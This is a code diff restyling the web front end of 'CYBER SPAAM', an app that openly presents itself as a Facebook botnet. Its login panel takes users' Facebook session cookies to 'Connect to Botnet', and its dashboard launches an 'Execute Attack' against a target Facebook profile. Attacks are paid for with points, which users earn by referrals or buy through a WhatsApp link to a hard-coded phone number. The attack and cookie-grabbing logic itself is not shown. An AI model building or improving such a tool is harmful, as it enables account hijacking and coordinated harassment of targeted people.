@@ -10,66 +10,82 @@
 
     :root {
       --bg-color: #0b0f19;
-      --card-bg: rgba(20, 25, 35, 0.85);
+      --card-bg: #151f32;
       --primary: #00ff41;
       --primary-glow: rgba(0, 255, 65, 0.4);
       --fb-blue: #1877f2;
       --danger: #ff3333;
       --share-color: #8b5cf6;
+      --whatsapp-color: #25D366;
       --text-main: #e2e8f0;
       --text-muted: #94a3b8;
+      --nav-bg: #0f172a;
     }
 
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Rajdhani', sans-serif; user-select: none; }
     
     body { 
       background-color: var(--bg-color); 
-      background-image: 
-        radial-gradient(circle at 15% 50%, rgba(0, 255, 65, 0.05), transparent 25%),
-        radial-gradient(circle at 85% 30%, rgba(24, 119, 242, 0.05), transparent 25%);
       color: var(--text-main); 
+      min-height: 100vh;
       display: flex;
+      flex-direction: column;
+    }
+
+    /* টপ বার */
+    .top-bar {
+      background: var(--nav-bg);
+      padding: 15px 20px;
+      text-align: center;
+      border-bottom: 1px solid #1e293b;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .top-bar h1 {
+      font-size: 22px;
+      color: var(--primary);
+      text-shadow: 0 0 10px var(--primary-glow);
+      letter-spacing: 2px;
+      cursor: pointer;
+    }
+
+    /* মূল কন্টেন্ট এরিয়া */
+    .content-area {
+      flex: 1;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      overflow-y: auto;
+      padding-bottom: 90px; /* নেভিগেশন বারের জন্য জায়গা */
+    }
+
+    .card {
+      width: 100%;
+      max-width: 400px;
+      background: var(--card-bg);
+      border-radius: 16px;
+      padding: 25px;
+      border: 1px solid #1e293b;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      margin-bottom: 20px;
+    }
+
+    /* লগইন প্যানেল */
+    .login-panel {
+      display: flex;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
       padding: 20px;
     }
 
-    .app-container {
-      width: 100%;
-      max-width: 400px;
-      background: var(--card-bg);
-      backdrop-filter: blur(12px);
-      -webkit-backdrop-filter: blur(12px);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: 20px;
-      padding: 30px 24px;
-      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
-      position: relative;
-      overflow: hidden;
-      animation: fadeIn 0.5s ease-out;
-    }
-
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-
-    .app-container::before {
-      content: '';
-      position: absolute;
-      top: 0; left: 0; right: 0;
-      height: 3px;
-      background: linear-gradient(90deg, transparent, var(--primary), transparent);
-      opacity: 0.7;
-    }
-
-    h1 {
-      font-size: 28px;
+    .login-panel .card {
+      padding: 40px 25px;
       text-align: center;
-      color: var(--primary);
-      text-shadow: 0 0 15px var(--primary-glow);
-      margin-bottom: 8px;
-      letter-spacing: 2px;
-      cursor: pointer;
-      user-select: none;
     }
 
     .subtitle {
@@ -78,9 +94,9 @@
       font-size: 14px;
       margin-bottom: 30px;
       text-transform: uppercase;
-      letter-spacing: 1px;
     }
 
+    /* বাটন স্টাইল */
     .btn {
       width: 100%;
       padding: 16px;
@@ -101,20 +117,11 @@
     .btn:active { transform: scale(0.97); }
     .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
 
-    .btn-fb { background: var(--fb-blue); color: #fff; box-shadow: 0 4px 15px rgba(24, 119, 242, 0.3); }
+    .btn-fb { background: var(--fb-blue); color: #fff; box-shadow: 0 4px 15px rgba(24, 119, 242, 0.3); margin-bottom: 15px; }
     .btn-success { background: var(--primary); color: #000; box-shadow: 0 4px 15px var(--primary-glow); }
     .btn-danger { background: var(--danger); color: #fff; box-shadow: 0 4px 15px rgba(255, 51, 51, 0.3); }
-    .btn-share { background: var(--share-color); color: #fff; box-shadow: 0 4px 15px rgba(139, 92, 246, 0.3); margin-top: 15px; }
 
-    .btn-outline { 
-      background: transparent; 
-      border: 1px solid #334155; 
-      color: var(--text-muted); 
-      font-size: 14px;
-      padding: 12px;
-      margin-top: 20px;
-    }
-
+    /* ড্যাশবোর্ড স্টাইল */
     .status-badge {
       display: inline-flex;
       align-items: center;
@@ -127,6 +134,7 @@
       font-weight: 600;
       margin: 0 auto 20px auto;
       border: 1px solid rgba(0, 255, 65, 0.2);
+      width: fit-content;
     }
 
     .status-dot {
@@ -140,18 +148,17 @@
 
     @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
 
-    .points-card {
+    .points-display {
       background: #0f172a;
       border: 1px solid #1e293b;
       border-radius: 12px;
       padding: 20px;
       text-align: center;
       margin-bottom: 24px;
-      position: relative;
     }
 
     .points-label { font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; }
-    .points-value { font-size: 36px; font-weight: 700; color: #facc15; text-shadow: 0 0 10px rgba(250, 204, 21, 0.3); }
+    .points-value { font-size: 42px; font-weight: 700; color: #facc15; text-shadow: 0 0 15px rgba(250, 204, 21, 0.3); }
 
     .input-group { margin-bottom: 24px; text-align: left; }
     .input-label { font-size: 12px; color: var(--text-muted); margin-bottom: 8px; display: block; text-transform: uppercase; }
@@ -173,46 +180,133 @@
     .msg-error { color: var(--danger); }
     .msg-success { color: var(--primary); }
     .msg-warning { color: #facc15; }
+    
     .hidden { display: none !important; }
+
     .spinner { width: 20px; height: 20px; border: 3px solid rgba(0,0,0,0.2); border-top-color: #000; border-radius: 50%; animation: spin 1s linear infinite; display: none; }
     @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ═══ বটম নেভিগেশন বার ═══ */
+    .bottom-nav {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 70px;
+      background: var(--nav-bg);
+      border-top: 1px solid #1e293b;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .nav-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: var(--text-muted);
+      text-decoration: none;
+      font-size: 11px;
+      font-weight: 600;
+      cursor: pointer;
+      width: 25%;
+      height: 100%;
+      transition: all 0.2s;
+    }
+
+    .nav-item:hover, .nav-item.active { color: var(--primary); }
+
+    .nav-icon {
+      width: 24px;
+      height: 24px;
+      margin-bottom: 4px;
+      fill: currentColor;
+    }
   </style>
 </head>
 <body>
 
-  <div id="loginPanel" class="app-container hidden">
-    <h1 id="appLogo">CYBER SPAAM</h1>
-    <p class="subtitle">Initialize Connection</p>
-    <button class="btn btn-fb" onclick="openFacebookLogin()" id="btnFbLogin">1. Login to Facebook</button>
-    <button class="btn btn-success" onclick="grabCookieAndSave()" id="btnConnect" style="margin-top: 16px;">
-      <span class="spinner" id="connectSpinner"></span>
-      <span id="connectText">2. Connect to Botnet</span>
-    </button>
-    <div id="loginStatus" class="message msg-error"></div>
+  <!-- 🔴 লগইন প্যানেল -->
+  <div id="loginPanel" class="login-panel hidden">
+    <div class="card">
+      <h1 id="appLogo">CYBER SPAAM</h1>
+      <p class="subtitle">Initialize Connection</p>
+      
+      <button class="btn btn-fb" onclick="openFacebookLogin()" id="btnFbLogin">
+        1. Login to Facebook
+      </button>
+      
+      <button class="btn btn-success" onclick="grabCookieAndSave()" id="btnConnect">
+        <span class="spinner" id="connectSpinner"></span>
+        <span id="connectText">2. Connect to Botnet</span>
+      </button>
+      
+      <div id="loginStatus" class="message msg-error"></div>
+    </div>
   </div>
 
-  <div id="attackPanel" class="app-container hidden">
-    <h1>DASHBOARD</h1>
-    <div style="text-align: center;">
-      <div class="status-badge">
-        <div class="status-dot"></div> BOTNET ACTIVE
+  <!-- 🟢 মেইন ড্যাশবোর্ড -->
+  <div id="attackPanel" class="hidden" style="display:flex; flex-direction:column; min-height:100vh;">
+    
+    <div class="top-bar">
+      <h1 id="dashLogo">DASHBOARD</h1>
+    </div>
+
+    <div class="content-area">
+      <div class="card">
+        <div style="text-align: center;">
+          <div class="status-badge">
+            <div class="status-dot"></div> BOTNET ACTIVE
+          </div>
+        </div>
+
+        <div class="points-display">
+          <div class="points-label">Available Points</div>
+          <div class="points-value" id="userPoints">0</div>
+        </div>
+
+        <div class="input-group">
+          <label class="input-label">Target Facebook URL</label>
+          <input type="url" id="targetUrl" placeholder="https://facebook.com/username">
+        </div>
+
+        <button class="btn btn-danger" onclick="launchAttack()" id="btnAttack">
+          <span class="spinner" id="attackSpinner" style="border-top-color: #fff;"></span>
+          <span id="attackText">Execute Attack (-1 Pt)</span>
+        </button>
+        
+        <div id="status" class="message msg-warning"></div>
       </div>
     </div>
-    <div class="points-card">
-      <div class="points-label">Available Points</div>
-      <div class="points-value" id="userPoints">0</div>
+
+    <!-- ═══ বটম নেভিগেশন বার ═══ -->
+    <div class="bottom-nav">
+      <!-- হোম বাটন (একটিভ) -->
+      <div class="nav-item active" onclick="window.scrollTo(0,0)">
+        <svg class="nav-icon" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+        Home
+      </div>
+      
+      <!-- রেফার বাটন -->
+      <div class="nav-item" onclick="goToShare()">
+        <svg class="nav-icon" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg>
+        Refer
+      </div>
+
+      <!-- বাই পয়েন্ট (হোয়াটসঅ্যাপ) বাটন -->
+      <div class="nav-item" onclick="buyPoints()" style="color: var(--whatsapp-color);">
+        <svg class="nav-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1.64 14.71c-.15.06-.33.09-.52.09-.16 0-.34-.03-.54-.08-.19-.06-.35-.12-.48-.19-.68-.35-1.4-.75-2.15-1.38-.64-.54-1.14-1.11-1.49-1.74-.07-.13-.13-.29-.19-.48-.05-.2-.08-.38-.08-.54 0-.19.03-.37.09-.52.07-.15.18-.33.35-.53l.51-.61c.16-.19.24-.4.24-.62 0-.16-.04-.32-.12-.49-.08-.17-.2-.4-.36-.67-.16-.27-.27-.45-.33-.55-.07-.12-.16-.19-.27-.23-.11-.04-.24-.05-.4-.05-.32 0-.6.12-.84.35-.24.23-.45.53-.64.91-.19.38-.29.79-.29 1.24 0 .55.14 1.11.41 1.68.28.57.63 1.09 1.06 1.57.43.47.9.86 1.41 1.16.51.3 1.01.45 1.5.45.45 0 .87-.1 1.25-.3.38-.2.69-.45.91-.76.23-.31.35-.62.35-.91 0-.15-.02-.27-.05-.37-.03-.1-.1-.17-.21-.22zm-2.82-6.35c-.15 0-.31.02-.46.05-.15.04-.28.09-.38.16-.1.07-.18.15-.22.25-.04.1-.07.21-.07.32 0 .11.02.21.06.32.04.11.11.21.2.31l.46.46c.17.17.34.31.51.4.16.09.32.13.46.13.16 0 .31-.04.44-.11.13-.07.24-.17.32-.29l.38-.5c.08-.11.14-.22.18-.32.04-.11.06-.22.06-.32 0-.11-.02-.21-.06-.32-.04-.11-.11-.2-.2-.3-.17-.17-.37-.3-.59-.39-.23-.09-.45-.14-.67-.14z"/></svg>
+        Buy
+      </div>
+
+      <!-- সেটিংস/লগআউট বাটন -->
+      <div class="nav-item" onclick="logout()">
+        <svg class="nav-icon" viewBox="0 0 24 24"><path d="M19.14,12.94c0.04-0.3,0.06-0.61,0.06-0.94c0-0.32-0.02-0.64-0.06-0.94l2.03-1.58c0.18-0.14,0.23-0.41,0.12-0.61 l-1.92-3.32c-0.12-0.22-0.37-0.29-0.59-0.22l-2.39,0.96c-0.5-0.38-1.03-0.7-1.62-0.94L14.4,2.81c-0.04-0.24-0.24-0.41-0.48-0.41 h-3.84c-0.24,0-0.43,0.17-0.47,0.41L9.25,5.35C8.66,5.59,8.12,5.92,7.63,6.29L5.24,5.33c-0.22-0.08-0.47,0-0.59,0.22L2.73,8.87 C2.62,9.08,2.66,9.34,2.86,9.48l2.03,1.58C4.84,11.36,4.8,11.69,4.8,12s0.02,0.64,0.06,0.94l-2.03,1.58 c-0.18,0.14-0.23,0.41-0.12,0.61l1.92,3.32c0.12,0.22,0.37,0.29,0.59,0.22l2.39-0.96c0.5,0.38,1.03,0.7,1.62,0.94l0.36,2.54 c0.05,0.24,0.24,0.41,0.48,0.41h3.84c0.24,0,0.44-0.17,0.47-0.41l0.36-2.54c0.59-0.24,1.13-0.56,1.62-0.94l2.39,0.96 c0.22,0.08,0.47,0,0.59-0.22l1.92-3.32c0.12-0.22,0.07-0.49-0.12-0.61L19.14,12.94z M12,15.6c-1.98,0-3.6-1.62-3.6-3.6 s1.62-3.6,3.6-3.6s3.6,1.62,3.6,3.6S13.98,15.6,12,15.6z"/></svg>
+        Settings
+      </div>
     </div>
-    <div class="input-group">
-      <label class="input-label">Target Facebook URL</label>
-      <input type="url" id="targetUrl" placeholder="https://facebook.com/username">
-    </div>
-    <button class="btn btn-danger" onclick="launchAttack()" id="btnAttack">
-      <span class="spinner" id="attackSpinner" style="border-top-color: #fff;"></span>
-      <span id="attackText">Execute Attack (-1 Pt)</span>
-    </button>
-    <button class="btn btn-share" onclick="goToShare()">Refer & Earn (+1 Point)</button>
-    <button class="btn btn-outline" onclick="logout()">Disconnect / Switch Account</button>
-    <div id="status" class="message msg-warning"></div>
   </div>
 
   <script type="module">
@@ -391,6 +485,14 @@
       }
     }
 
+    // ═══ ৫. হোয়াটসঅ্যাপ বাই পয়েন্ট ═══
+    window.buyPoints = function() {
+      const phoneNumber = "917865875762"; // কান্ট্রি কোড (৯১) সহ নম্বর
+      const message = "Hello Admin, I want to buy Points for Cyber Spaam. My Account ID is: " + currentUserKey;
+      const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
+      window.open(whatsappUrl, "_system");
+    }
+
     window.goToShare = function() {
       window.location.href = "share.html";
     }
@@ -406,7 +508,7 @@
 
     let tapCount = 0;
     let tapTimer;
-    document.getElementById('appLogo').addEventListener('click', () => {
+    document.getElementById('dashLogo').addEventListener('click', () => {
       tapCount++;
       clearTimeout(tapTimer);
       tapTimer = setTimeout(() => { tapCount = 0; }, 1000);
@@ -417,4 +519,4 @@
     });
   </script>
 </body>
-      </html>
+  </html>
